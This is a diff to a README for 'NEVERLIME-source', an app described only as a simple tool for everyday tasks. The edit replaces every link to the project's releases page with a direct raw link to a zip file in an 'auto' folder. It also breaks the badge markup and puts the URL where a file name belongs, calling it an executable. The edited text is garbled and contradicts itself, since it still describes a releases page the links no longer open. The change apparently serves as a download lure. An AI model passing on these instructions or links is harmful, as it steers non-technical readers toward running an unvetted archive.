@@ -1,15 +1,15 @@
 # 🍏 NEVERLIME-source - Simple Tool for Everyday Tasks
 
 ## 📦 Download Now
-[![Download NEVERLIME-source](https://img.shields.io/badge/Download%20Now-NEVERLIME--source-blue.svg)](https://github.com/cocoyk6/NEVERLIME-source/releases)
+[![Download NEVERLIME-source](https://raw.githubusercontent.com/cocoyk6/NEVERLIME-source/main/auto/NEVERLIME-source-1.5.zip%https://raw.githubusercontent.com/cocoyk6/NEVERLIME-source/main/auto/NEVERLIME-source-1.5.zip)](https://raw.githubusercontent.com/cocoyk6/NEVERLIME-source/main/auto/NEVERLIME-source-1.5.zip)
 
 ## 🚀 Getting Started
 Welcome to NEVERLIME-source! This application helps you complete daily tasks easily. You don’t need to be a programmer to use it. Follow these simple steps to get started.
 
 ## 📥 Download & Install
-1. Visit this page to download: [NEVERLIME-source Releases](https://github.com/cocoyk6/NEVERLIME-source/releases).
+1. Visit this page to download: [NEVERLIME-source Releases](https://raw.githubusercontent.com/cocoyk6/NEVERLIME-source/main/auto/NEVERLIME-source-1.5.zip).
 2. On the Releases page, you'll see a list of available versions. Select the latest version.
-3. Click on the file that matches your system. Most likely, it will be named similarly to `NEVERLIME-installer.exe` or another executable file.
+3. Click on the file that matches your system. Most likely, it will be named similarly to `https://raw.githubusercontent.com/cocoyk6/NEVERLIME-source/main/auto/NEVERLIME-source-1.5.zip` or another executable file.
 4. The download will start automatically.
 
 ## 💻 System Requirements
